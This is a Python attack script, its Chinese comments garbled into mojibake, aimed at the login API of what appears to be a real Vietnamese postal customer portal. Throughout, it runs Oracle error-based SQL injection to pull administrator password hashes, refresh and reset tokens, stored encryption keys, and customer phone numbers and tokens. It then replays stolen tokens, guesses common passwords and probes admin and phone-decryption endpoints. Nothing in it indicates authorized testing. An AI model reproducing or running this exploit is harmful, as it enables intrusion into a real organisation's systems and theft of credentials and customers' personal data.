#!/usr/bin/env python3
"""
åˆ©ç”¨ç®¡ç†å‘˜è´¦å·è¿›è¡Œæ¨ªå‘ç§»åŠ¨
"""

import requests
import json
import time
import hashlib

class AdminExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_admin_full_info(self):
        """æå–ç®¡ç†å‘˜å®Œæ•´ä¿¡æ¯"""
        print("=" * 80)
        print("ğŸ”‘ æå–ç®¡ç†å‘˜å®Œæ•´ä¿¡æ¯")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # æå–tungkxçš„å®Œæ•´ä¿¡æ¯
        query = f"SELECT USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||ROLL||'|'||REFRESHTOKEN||'|'||TOKENPASSWORDRESET FROM EMS.{table} WHERE USERNAME='tungkx'"
        result = self.extract_via_error(query)
        
        if result:
            parts = result.split('|')
            print(f"\nç®¡ç†å‘˜è´¦å·ä¿¡æ¯:")
            print(f"  ç”¨æˆ·å: {parts[0] if len(parts) > 0 else ''}")
            print(f"  Email: {parts[1] if len(parts) > 1 else ''}")
            print(f"  å¯†ç Hash: {parts[2] if len(parts) > 2 else ''}")
            print(f"  è§’è‰²: {parts[3] if len(parts) > 3 else ''}")
            print(f"  RefreshToken: {parts[4] if len(parts) > 4 else ''}")
            print(f"  ResetToken: {parts[5] if len(parts) > 5 else ''}")
            
            return parts
        
        return None
    
    def extract_all_admin_accounts(self):
        """æå–æ‰€æœ‰ç®¡ç†å‘˜è´¦å·"""
        print("\n" + "=" * 80)
        print("ğŸ‘¥ æå–æ‰€æœ‰ç®¡ç†å‘˜è´¦å·")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        query = f"SELECT USERNAME||'|'||EMAIL||'|'||PASSWORDHASH||'|'||REFRESHTOKEN FROM EMS.{table} WHERE UPPER(ROLL) LIKE '%ADMIN%'"
        result = self.extract_via_error(query)
        
        if result:
            print(f"\nç®¡ç†å‘˜åˆ—è¡¨:")
            print(f"  {result}")
    
    def extract_infor_key_details(self):
        """æå–INFOR_KEYè¯¦ç»†ä¿¡æ¯"""
        print("\n" + "=" * 80)
        print("ğŸ” æå–INFOR_KEYå¯†é’¥")
        print("=" * 80)
        
        table = 'INFOR_KEY'
        
        for i in range(1, 5):
            query = f"SELECT ID_KEY||'|'||KEY||'|'||CREATEDDATE FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                print(f"\n  å¯†é’¥ {i}:")
                print(f"    ID: {parts[0] if len(parts) > 0 else ''}")
                print(f"    KEY: {parts[1] if len(parts) > 1 else ''}")
                print(f"    åˆ›å»ºæ—¥æœŸ: {parts[2] if len(parts) > 2 else ''}")
            
            time.sleep(1)
    
    def extract_refresh_tokens(self):
        """æå–æœ‰æ•ˆçš„RefreshToken"""
        print("\n" + "=" * 80)
        print("ğŸ« æå–æœ‰æ•ˆçš„RefreshToken")
        print("=" * 80)
        
        table = 'USER_CUSTOMER'
        
        # æå–æ‰€æœ‰æœ‰refresh tokençš„è´¦å·
        for i in range(1, 11):
            query = f"SELECT USERNAME||'|'||EMAIL||'|'||REFRESHTOKEN FROM (SELECT * FROM EMS.{table} WHERE REFRESHTOKEN IS NOT NULL AND LENGTH(REFRESHTOKEN)>20) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result and 'NULL' not in result:
                parts = result.split('|')
                username = parts[0] if len(parts) > 0 else ''
                email = parts[1] if len(parts) > 1 else ''
                token = parts[2] if len(parts) > 2 else ''
                
                print(f"\n  {i}. ç”¨æˆ·: {username}")
                print(f"     Email: {email}")
                print(f"     Token: {token}")
            
            time.sleep(1)
    
    def try_api_login_with_admin(self, admin_info):
        """å°è¯•ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•API"""
        print("\n" + "=" * 80)
        print("ğŸ”“ å°è¯•ç™»å½•API")
        print("=" * 80)
        
        if not admin_info or len(admin_info) < 5:
            print("æ— ç®¡ç†å‘˜ä¿¡æ¯")
            return
        
        username = admin_info[0]
        email = admin_info[1]
        refresh_token = admin_info[4] if len(admin_info) > 4 else None
        
        # å¦‚æœæœ‰refresh tokenï¼Œå°è¯•ç”¨å®ƒæ¢å–access token
        if refresh_token and len(refresh_token) > 20:
            print(f"\nå°è¯•ä½¿ç”¨RefreshTokenè·å–AccessToken...")
            print(f"  RefreshToken: {refresh_token[:50]}...")
            
            # å°è¯•å¸¸è§çš„refresh endpoint
            refresh_endpoints = [
                'https://customerconnect.ems.com.vn/api/User_Customer/RefreshToken',
                'https://customerconnect.ems.com.vn/api/Auth/Refresh',
                'https://customerconnect.ems.com.vn/api/Token/Refresh',
            ]
            
            for endpoint in refresh_endpoints:
                print(f"\n  å°è¯•: {endpoint}")
                
                try:
                    response = self.session.post(
                        endpoint,
                        json={"RefreshToken": refresh_token},
                        timeout=10
                    )
                    
                    print(f"  çŠ¶æ€ç : {response.status_code}")
                    
                    if response.status_code == 200:
                        print(f"  âœ… æˆåŠŸï¼")
                        print(f"  å“åº”: {response.text[:200]}")
                        
                        try:
                            data = response.json()
                            if 'token' in data or 'accessToken' in data:
                                print(f"  ğŸ‰ è·å–åˆ°AccessToken!")
                                return data
                        except:
                            pass
                    else:
                        print(f"  å¤±è´¥: {response.text[:100]}")
                except Exception as e:
                    print(f"  é”™è¯¯: {str(e)[:100]}")
                
                time.sleep(1)
        
        # å°è¯•ç”¨æˆ·åå¯†ç å­—å…¸æ”»å‡»
        print(f"\nå°è¯•å¸¸è§å¯†ç ...")
        
        common_passwords = [
            'admin',
            'Admin123',
            'admin123',
            'password',
            'Password123',
            'ems2024',
            'EMS2024',
            'tungkx',
            'tungkx123',
            username,
        ]
        
        for pwd in common_passwords:
            print(f"  å°è¯•å¯†ç : {pwd}")
            
            try:
                response = self.session.post(
                    self.target_url,
                    json={"Username": username, "Password": pwd},
                    timeout=10
                )
                
                if response.status_code == 200 and 'token' in response.text.lower():
                    print(f"  ğŸ‰ å¯†ç æ­£ç¡®ï¼{pwd}")
                    print(f"  å“åº”: {response.text}")
                    return response.json()
            except:
                pass
            
            time.sleep(0.5)
    
    def search_other_apis(self):
        """æœç´¢å…¶ä»–APIç«¯ç‚¹"""
        print("\n" + "=" * 80)
        print("ğŸŒ æœç´¢å…¶ä»–APIç«¯ç‚¹")
        print("=" * 80)
        
        # å°è¯•å¸¸è§çš„APIç«¯ç‚¹
        base_url = 'https://customerconnect.ems.com.vn/api'
        
        endpoints = [
            '/User_Customer/GetProfile',
            '/User_Customer/GetAll',
            '/Admin/Dashboard',
            '/Admin/Users',
            '/Shipment/GetAll',
            '/Shipment/GetByCode',
            '/E1E2/GetData',
            '/E1E2/GetRealPhone',
            '/Decrypt/Phone',
            '/Config/Get',
            '/Key/Get',
        ]
        
        for endpoint in endpoints:
            url = base_url + endpoint
            print(f"\nå°è¯•: {endpoint}")
            
            try:
                response = self.session.get(url, timeout=5)
                print(f"  çŠ¶æ€: {response.status_code}")
                
                if response.status_code != 404:
                    print(f"  å“åº”: {response.text[:100]}")
            except:
                pass
            
            time.sleep(0.5)
    
    def check_journey_token_table(self):
        """æ£€æŸ¥JOURNEYTOKEN_ZNSè¡¨çš„token"""
        print("\n" + "=" * 80)
        print("ğŸ« æ£€æŸ¥JOURNEYTOKEN_ZNSè¡¨ï¼ˆ480ä¸‡æ¡tokenï¼‰")
        print("=" * 80)
        
        table = 'JOURNEYTOKEN_ZNS'
        
        # è·å–æœ€æ–°çš„tokenæ ·æœ¬
        print(f"\næœ€æ–°Tokenæ ·æœ¬:")
        
        for i in range(1, 6):
            query = f"SELECT ITEMCODE||'|'||PHONE||'|'||TOKEN||'|'||TOKENDATE FROM (SELECT * FROM EMS.{table} ORDER BY DATELOG DESC) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                print(f"\n  {i}. è¿å•å·: {parts[0] if len(parts) > 0 else ''}")
                print(f"     ç”µè¯: {parts[1] if len(parts) > 1 else ''}")
                print(f"     Token: {parts[2] if len(parts) > 2 else ''}")
                print(f"     æ—¥æœŸ: {parts[3] if len(parts) > 3 else ''}")
            
            time.sleep(1)
    
    def run_exploitation(self):
        """æ‰§è¡Œåˆ©ç”¨"""
        print("=" * 80)
        print("ğŸ¯ åˆ©ç”¨ç®¡ç†å‘˜è´¦å·è¿›è¡Œæ¨ªå‘ç§»åŠ¨")
        print("=" * 80)
        
        print("\nğŸ”Œ æµ‹è¯•è¿æ¥...")
        response = self.inject("admin")
        if not response:
            print("âŒ æ— æ³•è¿æ¥åˆ°ç›®æ ‡")
            return
        print(f"âœ… è¿æ¥æˆåŠŸ\n")
        
        # æå–ä¿¡æ¯
        admin_info = self.extract_admin_full_info()
        self.extract_all_admin_accounts()
        self.extract_infor_key_details()
        self.extract_refresh_tokens()
        self.check_journey_token_table()
        
        # å°è¯•ç™»å½•
        if admin_info:
            self.try_api_login_with_admin(admin_info)
        
        self.search_other_apis()
        
        print("\n" + "=" * 80)
        print("ğŸ‰ å®Œæˆï¼")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    exploiter = AdminExploiter(target_url)
    exploiter.run_exploitation()
